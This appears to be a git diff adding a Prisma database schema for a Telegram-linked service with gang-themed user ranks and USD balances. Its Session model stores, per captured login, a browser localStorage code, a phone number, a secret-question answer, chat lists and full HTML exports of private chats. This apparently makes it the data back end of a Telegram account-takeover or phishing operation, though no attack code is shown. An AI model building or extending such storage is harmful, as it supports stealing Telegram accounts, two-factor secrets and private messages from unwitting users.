@@ -1,0 +1,104 @@
+// This is your Prisma schema file,
+// learn more about it in the docs: https://pris.ly/d/prisma-schema
+
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "sqlite"
+  url      = env("DATABASE_URL")
+}
+
+enum UserRole {
+  ADMIN
+  MEMBER
+}
+
+enum UserRank {
+  ROOKIE
+  RUNNER
+  HUSTLER
+  THUG
+  ENFORCER
+  UNDERBOSS
+  OVERLORD
+  BOSS
+  GODFATHER
+  SHADOWMASTER
+}
+
+model User {
+  id          String   @id @default(cuid())
+  username    String   @unique
+  email       String?  @unique
+  password    String   // Hashed password
+  tg_username String?  // Telegram username
+  role        UserRole @default(MEMBER)
+  rank        UserRank @default(ROOKIE) // User rank in the system
+  isActive    Boolean  @default(true)
+  balance     Float    @default(0.0) // User balance in USD
+  lastLoginAt DateTime?
+  createdAt   DateTime @default(now()) @map("created_at")
+  updatedAt   DateTime @default(now()) @updatedAt @map("updated_at")
+
+  // Ban-related fields
+  isBanned        Boolean   @default(false)
+  banReason       String?
+  banDuration     String?   // '1day', '3days', '7days', '1month', 'permanent'
+  banExpiresAt    DateTime?
+  bannedAt        DateTime?
+  bannedBy        String?   // User ID of the admin who banned the user
+
+  sessions UserSession[]
+  telegramSessions Session[] // Sessions for Telegram login
+
+  @@map("users")
+}
+
+model UserSession {
+  id        String   @id @default(cuid())
+  userId    String   @map("user_id")
+  token     String   @unique
+  expiresAt DateTime @map("expires_at")
+  createdAt DateTime @default(now()) @map("created_at")
+  updatedAt DateTime @default(now()) @updatedAt @map("updated_at")
+
+  user User @relation(fields: [userId], references: [id], onDelete: Cascade)
+
+  @@map("user_sessions")
+}
+
+model Session {
+  id                    String   @id
+  socketId              String?  @map("socket_id")
+  deviceHash            String?  @map("device_hash")
+  userId                String?  @map("user_id") // Foreign key to users table
+  status                String
+  startTime             DateTime @map("start_time")
+  endTime               DateTime? @map("end_time")
+  parameters            String?  // JSON string
+  error                 String?
+  localStorageCode      String?  @map("localStorage_code")
+  username              String?
+  avatarSrc             String?  @map("avatar_src")
+  phoneNumber           String?  @map("phone_number")
+  secretQuestionAnswer  String?  @map("secret_question_answer")
+  closedBy              String?  @map("closed_by")
+  disconnectedBy        String?  @map("disconnected_by")
+  cleanedUpBy           String?  @map("cleaned_up_by")
+  driverClosed          Boolean? @map("driver_closed")
+  chatList              String?  @map("chat_list") // JSON string of chat titles
+  chatListCollectedAt   DateTime? @map("chat_list_collected_at")
+  savedMessagesExport   String?  @map("saved_messages_export") // Exported Saved Messages HTML (deprecated, use chatExports)
+  savedMessagesExportedAt DateTime? @map("saved_messages_exported_at")
+  chatExports           String?  @map("chat_exports") // JSON string mapping chat IDs/names to export HTML: {"chatId": "html", ...}
+  chatExportsCollectedAt DateTime? @map("chat_exports_collected_at")
+  createdAt             DateTime @default(now()) @map("created_at")
+  updatedAt             DateTime @default(now()) @updatedAt @map("updated_at")
+
+  // Relation to User
+  user User? @relation(fields: [userId], references: [id], onDelete: SetNull)
+
+  @@map("sessions")
+}
